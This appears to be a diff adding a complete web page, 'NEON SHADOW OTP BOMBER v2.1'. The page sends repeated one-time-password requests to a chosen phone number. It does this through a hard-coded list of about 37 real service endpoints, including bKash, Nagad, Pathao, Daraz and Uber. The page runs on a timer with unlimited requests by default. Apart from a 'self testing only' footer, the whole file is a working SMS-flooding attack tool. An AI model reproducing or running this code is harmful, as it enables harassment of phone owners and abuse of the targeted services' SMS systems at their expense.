@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>NEON SHADOW | OTP BOMBER</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+  <style>
+    body {
+      background: radial-gradient(circle at center, #0a0a0a, #000000);
+      font-family: 'Courier New', monospace;
+    }
+    .matrix-bg {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: linear-gradient(transparent, rgba(0, 255, 70, 0.03));
+      pointer-events: none;
+      z-index: -1;
+      animation: matrix 25s linear infinite;
+    }
+    .neon-green {
+      text-shadow: 0 0 15px #00ff46, 0 0 30px #00ff46;
+    }
+    .glass {
+      background: rgba(15, 23, 42, 0.75);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(0, 255, 70, 0.3);
+    }
+    .glow-btn:hover {
+      box-shadow: 0 0 30px #00ff46;
+      transform: translateY(-4px);
+    }
+    .terminal {
+      font-family: 'Courier New', monospace;
+      background: #0a0a0a;
+      border: 1px solid #00ff46;
+    }
+  </style>
+</head>
+<body class="text-green-400 min-h-screen">
+
+  <div class="matrix-bg"></div>
+
+  <div class="max-w-5xl mx-auto p-6 pt-10">
+    <div class="text-center mb-10">
+      <h1 class="text-5xl font-bold neon-green tracking-widest">NEON SHADOW</h1>
+      <p class="text-red-500 text-2xl mt-2 tracking-[4px]">OTP BOMBER v2.1</p>
+      <div class="h-1 w-40 bg-green-500 mx-auto mt-4"></div>
+    </div>
+
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+      <!-- Control Panel -->
+      <div class="glass rounded-3xl p-8">
+        <h2 class="text-2xl font-bold mb-6 flex items-center gap-3">
+          <i class="fas fa-terminal"></i> CONTROL PANEL
+        </h2>
+
+        <select id="service" onchange="loadService()" 
+                class="w-full p-4 bg-black border border-green-500/50 rounded-2xl text-green-400 text-lg mb-5">
+          <option value="">── SELECT TARGET ──</option>
+        </select>
+
+        <input id="number" type="text" placeholder="017XXXXXXXX" 
+               class="w-full p-4 bg-black border border-green-500/50 rounded-2xl text-xl mb-5">
+
+        <input id="apiUrl" type="text" placeholder="Custom API URL (optional)" 
+               class="w-full p-4 bg-black border border-green-500/50 rounded-2xl mb-5">
+
+        <textarea id="bodyTemplate" rows="4" placeholder='{"phone": "{number}"}' 
+                  class="w-full p-4 bg-black border border-green-500/50 rounded-2xl font-mono text-sm mb-5"></textarea>
+
+        <div class="grid grid-cols-2 gap-5">
+          <div>
+            <label class="block text-sm mb-2">INTERVAL (Seconds)</label>
+            <input id="interval" type="number" value="4" min="3" 
+                   class="w-full p-4 bg-black border border-green-500/50 rounded-2xl">
+          </div>
+          <div>
+            <label class="block text-sm mb-2">MAX REQUESTS (0 = Unlimited)</label>
+            <input id="maxRequests" type="number" value="0" min="0" 
+                   class="w-full p-4 bg-black border border-green-500/50 rounded-2xl">
+          </div>
+        </div>
+
+        <div class="grid grid-cols-2 gap-4 mt-8">
+          <button onclick="startAttack()" 
+                  class="glow-btn bg-green-600 hover:bg-green-500 py-6 rounded-2xl font-bold text-2xl flex items-center justify-center gap-3">
+            <i class="fas fa-play"></i> START ATTACK
+          </button>
+          <button onclick="stopAttack()" 
+                  class="glow-btn bg-red-600 hover:bg-red-500 py-6 rounded-2xl font-bold text-2xl flex items-center justify-center gap-3">
+            <i class="fas fa-stop"></i> STOP
+          </button>
+        </div>
+      </div>
+
+      <!-- Status & Log -->
+      <div class="space-y-6">
+        <div class="glass rounded-3xl p-6 text-center">
+          <div id="status" class="text-2xl font-bold py-4 min-h-[60px]"></div>
+          <div id="counter" class="text-3xl font-bold text-yellow-400"></div>
+        </div>
+
+        <div id="log" class="terminal glass rounded-3xl p-6 h-96 overflow-y-auto text-sm leading-relaxed"></div>
+      </div>
+    </div>
+
+    <div class="text-center mt-12 text-xs text-green-500/40">
+      NEON SHADOW • SELF TESTING TOOL ONLY • USE AT YOUR OWN RISK
+    </div>
+  </div>
+
+  <script>
+    const services = [
+      {name: "Chorki", url: "https://api-dynamic.chorki.com/v1/auth/login", body: '{"mobile":"{number}"}'},
+      {name: "DocTime", url: "https://api.doctime.com.bd/api/authenticate", body: '{"phone":"{number}"}'},
+      {name: "RedX", url: "https://api.redx.com.bd/v1/user/signup", body: '{"phone":"{number}"}'},
+      {name: "Shikho", url: "https://api.shikho.com/auth/v2/send/sms", body: '{"phone":"{number}"}'},
+      {name: "KFC BD", url: "https://api.kfcbd.com/register", body: '{"mobile_number":"{number}"}'},
+      {name: "OsudPotro", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: '{"phone":"{number}"}'},
+      {name: "Arogga", url: "https://api.arogga.com/auth/v1/sms/send", body: '{"phone":"{number}"}'},
+      {name: "Kabbik", url: "https://api.kabbik.com/v1/auth/otpnew", body: '{"phone":"{number}"}'},
+      {name: "Medeasy", url: "https://api.medeasy.health/api/send-otp", body: '{"phone":"{number}"}'},
+      {name: "Pathao", url: "https://api.pathao.com/v1/auth/otp/send", body: '{"mobile":"{number}"}'},
+      {name: "10 Minute School", url: "https://api.10minuteschool.com/v1/auth/send-otp", body: '{"phone":"{number}"}'},
+      {name: "Ostad", url: "https://api.ostad.app/api/v1/auth/send-otp", body: '{"phone":"{number}"}'},
+      {name: "Binge", url: "https://binge.buzz/api/v1/auth/send-otp", body: '{"phone":"{number}"}'},
+      {name: "Toffee", url: "https://toffeelive.com/api/v1/login-otp", body: '{"phone":"{number}"}'},
+      {name: "Chaldal", url: "https://chaldal.com/api/customer/login", body: '{"phone":"{number}"}'},
+      {name: "Shohoz", url: "https://api.shohoz.com/v1/auth/send-otp", body: '{"phone":"{number}"}'},
+      {name: "Jatri", url: "https://api.jatri.co/api/v1/user/login", body: '{"phone_number":"{number}"}'},
+      {name: "SteadFast", url: "https://steadfast.com.bd/api/v1/login", body: '{"phone":"{number}"}'},
+      {name: "Pickaboo", url: "https://api.pickaboo.com/v1/auth/login", body: '{"phone":"{number}"}'},
+      {name: "Paperfly", url: "https://api.paperfly.com.bd/v1/auth", body: '{"phone":"{number}"}'},
+      {name: "Daraz", url: "https://api.daraz.com.bd/auth/send-otp", body: '{"phone":"{number}"}'},
+      {name: "Foodpanda", url: "https://api.foodpanda.com.bd/v1/auth/otp", body: '{"phone_number":"{number}"}'},
+      {name: "Nagad", url: "https://api.nagad.com.bd/api/login", body: '{"mobileNumber":"{number}"}'},
+      {name: "bKash", url: "https://api.bkash.com/v1/login/otp", body: '{"phone":"{number}"}'},
+      {name: "Uber", url: "https://api.uber.com/v1/auth/otp", body: '{"phone":"{number}"}'},
+      {name: "Sheba.xyz", url: "https://api.sheba.xyz/v1/auth/send-otp", body: '{"mobile":"{number}"}'},
+      {name: "Rokomari", url: "https://api.rokomari.com/auth/send-otp", body: '{"phone":"{number}"}'},
+      {name: "HungryNaki", url: "https://api.hungrynaki.com/v1/auth/otp", body: '{"phone":"{number}"}'},
+      {name: "Shadhin", url: "https://api.shadhin.com.bd/api/otp/send", body: '{"phone":"{number}"}'},
+      {name: "Upay", url: "https://api.upay.com.bd/api/v1/send-otp", body: '{"mobile_number":"{number}"}'},
+      {name: "Walton", url: "https://api.waltonbd.com/auth/otp", body: '{"mobile":"{number}"}'},
+      {name: "Singer BD", url: "https://api.singerbd.com/send-otp", body: '{"phone":"{number}"}'},
+      {name: "Transcom", url: "https://api.transcombd.com/api/otp", body: '{"contact":"{number}"}'},
+      {name: "AjkerDeal", url: "https://api.ajkerdeal.com/api/v1/auth/otp", body: '{"mobile":"{number}"}'},
+      {name: "BdJobs", url: "https://api.bdjobs.com/auth/send-otp", body: '{"phone":"{number}"}'},
+      {name: "Blink", url: "https://api.blink.com.bd/api/v1/send-otp", body: '{"mobile":"{number}"}'},
+      {name: "Evaly", url: "https://api.evaly.com.bd/api/v1/send-otp", body: '{"phone":"{number}"}'}
+    ];
+
+    function loadServices() {
+      const select = document.getElementById('service');
+      services.forEach(s => {
+        const opt = document.createElement('option');
+        opt.value = s.name;
+        opt.textContent = s.name;
+        select.appendChild(opt);
+      });
+    }
+
+    function loadService() {
+      const selected = document.getElementById('service').value;
+      const service = services.find(s => s.name === selected);
+      if (service) {
+        document.getElementById('apiUrl').value = service.url;
+        document.getElementById('bodyTemplate').value = service.body;
+      }
+    }
+
+    let intervalId = null;
+    let count = 0;
+    let currentNumber = "";
+
+    function log(text, color = "text-green-400") {
+      const logDiv = document.getElementById('log');
+      const time = new Date().toLocaleTimeString();
+      logDiv.innerHTML += `<span class="${color}">[${time}] ${text}</span><br>`;
+      logDiv.scrollTop = logDiv.scrollHeight;
+    }
+
+    async function sendRequest() {
+      const number = document.getElementById('number').value.trim();
+      const apiUrl = document.getElementById('apiUrl').value.trim();
+      const bodyTemplate = document.getElementById('bodyTemplate').value.trim();
+
+      try {
+        const finalBody = bodyTemplate.replace(/\{number\}/g, number);
+        await fetch(apiUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: finalBody
+        });
+        count++;
+        document.getElementById('counter').textContent = `REQUESTS SENT: ${count}`;
+        log(`✓ SUCCESS → ${number}`, "text-green-400");
+      } catch (e) {
+        count++;
+        document.getElementById('counter').textContent = `REQUESTS SENT: ${count}`;
+        log(`✗ FAILED → ${e.message}`, "text-red-400");
+      }
+    }
+
+    function startAttack() {
+      const number = document.getElementById('number').value.trim();
+      const apiUrl = document.getElementById('apiUrl').value.trim();
+      const intervalSec = parseInt(document.getElementById('interval').value) * 1000;
+      const maxRequests = parseInt(document.getElementById('maxRequests').value) || 0;
+
+      if (!number || !apiUrl) {
+        alert("নাম্বার এবং API URL দিতে হবে");
+        return;
+      }
+
+      if (intervalId) {
+        alert("ইতিমধ্যে চলছে!");
+        return;
+      }
+
+      currentNumber = number;
+      count = 0;
+      document.getElementById('counter').textContent = "REQUESTS SENT: 0";
+      document.getElementById('status').innerHTML = `<span class="text-green-400">● ATTACK RUNNING ON ${number}</span>`;
+
+      log(`🚀 ATTACK STARTED ON ${number}`, "text-yellow-400");
+
+      intervalId = setInterval(() => {
+        sendRequest();
+        if (maxRequests > 0 && count >= maxRequests) {
+          stopAttack();
+          log("✅ MAX LIMIT REACHED - AUTO STOPPED", "text-yellow-400");
+        }
+      }, intervalSec);
+    }
+
+    function stopAttack() {
+      if (intervalId) clearInterval(intervalId);
+      intervalId = null;
+      document.getElementById('status').innerHTML = `<span class="text-red-500">● ATTACK STOPPED</span>`;
+      log("⛔ ATTACK TERMINATED", "text-red-400");
+    }
+
+    // Initialize
+    window.onload = loadServices;
+  </script>
+</body>
+</html>
